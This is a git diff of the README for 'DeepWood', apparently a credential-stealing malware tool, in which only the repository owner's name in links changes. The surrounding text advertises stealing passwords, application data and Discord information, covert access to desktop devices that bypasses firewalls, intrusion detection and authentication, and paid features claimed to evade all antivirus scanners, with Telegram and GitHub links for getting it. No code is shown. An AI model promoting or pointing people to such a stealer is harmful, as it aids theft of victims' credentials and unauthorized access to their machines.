@@ -1,5 +1,5 @@
 <a href="https://t.me/DeepWoodStealer">
-  <img src="https://github.com/exosploits/DeepWood/blob/main/DeepWood_assets/img/github_nr.png"  
+  <img src="https://github.com/Nxploit/DeepWood/blob/main/DeepWood_assets/img/github_nr.png"  
     width="200" align="right" alt="Join Telegram" />
 </a>  
        
@@ -10,7 +10,7 @@ You can recover passwords, aplication data, discord info and much more.
 
 It is great for unrestricted access to desktop devices, enabling discreet exploration of applications and files while bypassing typical security measures like firewalls, intrusion detection systems, and authentication controls.
 
-Deepwood is available as [Premium Version](https://t.me/DeepwoodStealer) or [Free Version](https://github.com/exosploits/DeepWood) on Github.
+Deepwood is available as [Premium Version](https://t.me/DeepwoodStealer) or [Free Version](https://github.com/Nxploit/DeepWood) on Github.
 
 ## Premium Version Features
 
@@ -22,12 +22,12 @@ Deepwood is available as [Premium Version](https://t.me/DeepwoodStealer) or [Fre
  - Melt Stub.
  - Full Fud 0/71 Detectation
 
-![photo](https://github.com/exosploits/DeepWood/assets/170117420/48617db6-2dbf-4d00-aa9f-2d01221d657e)
+![photo](https://github.com/Nxploit/DeepWood/assets/170117420/48617db6-2dbf-4d00-aa9f-2d01221d657e)
 
 
 [![GitHub license](https://img.shields.io/github/license/zauberzeug/nicegui?color=orange)](https://github.com/zauberzeug/nicegui/blob/main/LICENSE)
-[![GitHub forks](https://img.shields.io/github/forks/exosploits/DeepWood)](https://github.com/exosploits/DeepWood/network)
-[![GitHub stars](https://img.shields.io/github/stars/exosploits/DeepWood)](https://github.com/exosploits/DeepWood/stargazers)
+[![GitHub forks](https://img.shields.io/github/forks/Nxploit/DeepWood)](https://github.com/Nxploit/DeepWood/network)
+[![GitHub stars](https://img.shields.io/github/stars/Nxploit/DeepWood)](https://github.com/Nxploit/DeepWood/stargazers)
  
 ## Free Features
 
@@ -80,7 +80,7 @@ Note: NiceGUI will automatically reload CFG if you change values.
 
 ## GUI
 
-![Screenshot 2024-05-18 022622](https://github.com/exosploits/DeepWood/assets/170117420/60e05331-b568-4a64-a0c5-2e8b3f65ece8)
+![Screenshot 2024-05-18 022622](https://github.com/Nxploit/DeepWood/assets/170117420/60e05331-b568-4a64-a0c5-2e8b3f65ece8)
 
 
 ## Why?
